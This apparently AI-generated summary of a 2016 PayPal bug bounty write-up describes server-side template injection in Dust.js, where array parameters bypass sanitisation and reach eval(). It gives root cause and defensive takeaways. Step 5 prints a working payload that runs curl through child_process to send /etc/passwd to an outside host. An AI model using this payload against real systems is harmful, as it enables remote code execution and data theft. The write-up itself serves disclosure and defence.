# PayPal Node.js Code Injection via Dust.js Template Engine

## Metadata
- **Source:** writeups.io
- **Date:** 2026-06-09
- **Author:** Various
- **Program:** PayPal (demo.paypal.com)
- **Bounty:** $10,000
- **Severity:** critical
- **Vuln types:** Code Injection, Remote Code Execution, Server-Side Template Injection, Unsafe use of eval(), Type Confusion
- **Category:** memory-binary
- **Writeup:** http://artsploit.blogspot.com/2016/08/pprce2.html

## Summary
PayPal's Node.js application used the Dust.js templating engine with unsafe eval() in the 'if' helper function. By exploiting type confusion through array parameters and bypassing insufficient input sanitization, an attacker could inject arbitrary JavaScript code and achieve remote code execution on the server.

## Attack scenario (step by step)
1. Attacker performs HTTP parameter fuzzing on demo.paypal.com and discovers the application responds differently to backslash and newline characters
2. Error messages reveal the application uses Dust.js templating engine with eval() for 'if' helper expression evaluation
3. Attacker identifies that single quotes and double quotes are HTML-encoded as sanitization, but only when input is a string
4. Attacker exploits Node.js parameter parsing to send device parameter as an array instead of string using device[]=value syntax, bypassing string-based sanitization
5. Attacker crafts payload: device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')- which bypasses HTML encoding since array elements are not strings
6. Server evaluates the injected JavaScript code in eval(), executing arbitrary shell commands and exfiltrating /etc/passwd to attacker's server

## Root cause
The vulnerability stems from multiple compounding issues: (1) use of eval() for expression evaluation in Dust.js 'if' helper, (2) insufficient input sanitization that only HTML-encodes strings but fails when input is an array, (3) lack of type validation before processing user input in template contexts, (4) no sandboxing or restrictions on eval() execution

## Attacker mindset
Methodical fuzzer discovering unusual server responses, followed by source code analysis to understand the templating engine. Once eval() was identified, the attacker recognized the escape opportunity through type confusion - realizing that sanitization functions assume string inputs but fail gracefully on arrays, allowing direct code injection without quote escaping.

## Defensive takeaways
- Never use eval() or similar dynamic code execution functions on user input, especially in template contexts
- Implement robust input validation that checks both type and value - sanitization must occur after type normalization
- Enforce strict type checking on all parameters before template processing
- Use parameterized/safe templating functions instead of eval()-based expression evaluators
- Apply defense-in-depth: validate input format, normalize types, then sanitize values
- Regular dependency updates: older versions of Dust.js contained this vulnerable eval() pattern
- Security testing should include fuzzing with various input types (strings, arrays, objects) not just string values
- Use Content Security Policy and sandboxing mechanisms to limit eval() impact

## Variant hunting
['Search for other uses of eval() or Function() constructor in Node.js template engines (Jade, EJS, Handlebars if vulnerable versions)', 'Look for parameter parsing followed by template rendering without type checking', "Identify applications using Node.js 'qs' module parser that don't normalize array/string types before processing", 'Test other PayPal properties and endpoints for similar Dust.js usage patterns', 'Check if other helper functions in Dust.js or similar engines use eval() on user input', 'Hunt for type confusion vulnerabilities in other JavaScript template engines and middleware']

## MITRE ATT&CK
- T1190
- T1059
- T1059.007
- T1203
- T1211

## Notes
This is a critical vulnerability demonstrating the danger of eval() in web contexts. The type confusion exploitation is particularly clever - the sanitization function (escapeSpecialCharacters in Dust.js) explicitly checks 'if (typeof s === "string")' but has no fallback for non-string types, allowing arrays to bypass sanitization entirely. The attack bypassed protection through implementation of type confusion rather than cryptographic break. Discovered August 2016, affecting demo.paypal.com running older Dust.js version.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-06-09*
